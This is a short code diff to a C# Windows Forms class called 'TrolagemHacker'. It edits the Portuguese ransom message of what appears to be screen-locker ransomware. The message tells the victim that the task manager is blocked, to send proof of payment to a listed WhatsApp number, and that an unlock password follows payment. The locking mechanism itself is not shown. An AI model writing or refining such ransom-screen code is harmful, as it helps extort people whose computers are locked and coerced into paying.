@@ -124,7 +124,7 @@ public class TrolagemHacker : Form
                         "- Gerenciador de tarefas: BLOQUEADA\n\n" +
                         "Após a realização do pagamento, o usuário deverá enviar o comprovante de transação para o seguinte WhatsApp:\n" +
                         "+55 12 99743-5455\n" +
-                        "A senha de desbloqueio será fornecida exclusivamente após a confirmação do pagamento e da validação do comprovante." +
+                        "A senha de desbloqueio será fornecida exclusivamente após a confirmação do pagamento." +
                         "Você tem o prazo abaixo...";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 11, FontStyle.Bold);
